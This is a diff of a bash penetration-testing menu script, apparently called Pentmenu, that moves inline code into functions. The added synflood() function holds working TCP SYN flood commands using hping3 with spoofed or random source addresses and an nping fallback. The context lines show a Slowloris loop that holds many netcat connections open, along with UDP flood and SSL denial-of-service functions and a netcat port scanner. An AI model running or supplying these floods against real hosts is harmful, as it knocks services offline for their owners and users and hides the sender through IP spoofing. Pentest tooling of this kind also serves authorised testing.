@@ -1,5 +1,66 @@
 #!/bin/bash
 PS3="Pentmenu>"
+## create TCP SYN flood function
+synflood()
+{		echo "TCP SYN Flood uses hping3...checking for hping3..."
+	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
+## hping3 is found, so use that for TCP SYN Flood
+	echo "Enter target"
+		read TARGET
+	echo "Enter target port"
+		read PORT
+	echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
+		read SOURCE
+	: ${SOURCE:=i}
+	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
+		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
+		sudo hping3 --flood --spoof $SOURCE -p $PORT -S $TARGET
+	elif [ "$SOURCE" = "r" ]; then
+		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
+		sudo hping3 --flood --rand-source -p $PORT -S $TARGET
+	elif [ "$SOURCE" = "i" ]; then
+		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
+		sudo hping3 --flood -p $PORT -S $TARGET
+	else echo "Not a valid option!  Using interface IP"
+		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
+		sudo hping3 --flood -p $PORT -S $TARGET
+	fi
+## No hping3 so using nping for TCP SYN Flood
+	else echo "hping3 not found :( trying nping instead"
+		echo ""
+		echo "Trying TCP SYN Flood with nping..this will work but is not ideal"
+		echo "Enter target"
+	read TARGET
+		echo "Enter target port"
+	read PORT
+		echo "Enter Source IP or use [i]nterface IP (default):"
+	read SOURCE
+		: ${SOURCE:=i}
+		echo "Enter number of packets to send per second (default is 10000):"
+	read RATE
+		: ${RATE:=10000}
+		echo "Enter total number of packets to send (default is 100000):"
+	read TOTAL
+		: ${TOTAL:=100000}
+		echo "Starting TCP SYN Flood..."
+	if 	[ "$SOURCE" = "i" ]; then
+		sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
+	else sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
+	fi
+	fi
+}
+
+## create portscan function
+portscan()
+{		echo "TCP Port Scanner uses netcat..."
+		echo "Enter target IP"
+	read TARGET
+		echo "Enter target port (e.g. '80') or port range (e.g. '1-1000')"
+	read PORT
+		echo "Starting TCP Port Scan"
+		nc -zv -w 2 $TARGET $PORT
+}
+
 ## create showip function
 showip()
 {		echo "External IP lookup uses curl..."
@@ -14,6 +75,7 @@ showip()
 	fi
 		echo ""
 }
+
 ## create slowloris function
 slowloris()
 { echo "Using netcat for Slowloris attack...."
@@ -45,6 +107,7 @@ echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
 echo "Slowloris attack ongoing...this is connection $i"; echo -e "GET / HTTP/1.1\r\nHost:$TARGET\r\n$RANDOM: $RANDOM\r\n"|nc -i 59 --wait=300 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
 echo "Opened $CONNS connections....returning to menu"
 }
+
 ## create UDP Flood function
 udpflood()
 { echo "UDP Flood uses hping3...checking for hping3..."
@@ -98,6 +161,7 @@ if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
 	fi
 fi
 }
+
 ## create ssldos function
 ssldos() 
 { echo "Using openssl for SSL DOS"
@@ -142,6 +206,7 @@ while : for i in {1..10}
 done
 fi
 }
+
 ## create listener function
 listener()
 	{ echo "Enter protocol, [t]cp (default) or [u]dp:"
@@ -229,61 +294,10 @@ bannergrab()
 		showip
 ## TCP SYN Flood DOS
  	elif [ "$opt" = "TCP SYN Flood" ]; then
-		echo "TCP SYN Flood uses hping3...checking for hping3..."
-	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
-## hping3 is found, so use that for TCP SYN Flood
-	echo "Enter target"
-		read TARGET
-	echo "Enter target port"
-		read PORT
-	echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
-		read SOURCE
-	: ${SOURCE:=i}
-	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
-		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood --spoof $SOURCE -p $PORT -S $TARGET
-	elif [ "$SOURCE" = "r" ]; then
-		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood --rand-source -p $PORT -S $TARGET
-	elif [ "$SOURCE" = "i" ]; then
-		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood -p $PORT -S $TARGET
-	else echo "Not a valid option!  Using interface IP"
-		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
-		sudo hping3 --flood -p $PORT -S $TARGET
-	fi
-## No hping3 so using nping for TCP SYN Flood
-	else echo "hping3 not found :( trying nping instead"
-		echo ""
-		echo "Trying TCP SYN Flood with nping..this will work but is not ideal"
-		echo "Enter target"
-	read TARGET
-		echo "Enter target port"
-	read PORT
-		echo "Enter Source IP or use [i]nterface IP (default):"
-	read SOURCE
-		: ${SOURCE:=i}
-		echo "Enter number of packets to send per second (default is 10000):"
-	read RATE
-		: ${RATE:=10000}
-		echo "Enter total number of packets to send (default is 100000):"
-	read TOTAL
-		: ${TOTAL:=100000}
-		echo "Starting TCP SYN Flood..."
-	if 	[ "$SOURCE" = "i" ]; then
-		sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
-	else sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
-	fi
-	fi
+		synflood
 ## TCP SYN Port Scan using nc
 	elif [ "$opt" = "TCP Port Scanner" ]; then
-		echo "TCP Port Scanner uses netcat..."
-		echo "Enter target IP"
-	read TARGET
-		echo "Enter target port (e.g. '80') or port range (e.g. '1-1000')"
-	read PORT
-		echo "Starting TCP Port Scan"
-		nc -zv -w 2 $TARGET $PORT
+		portscan
 	elif [ "$opt" = "Create Listener" ]; then
 		listener
 ## Simple Banner Grabber
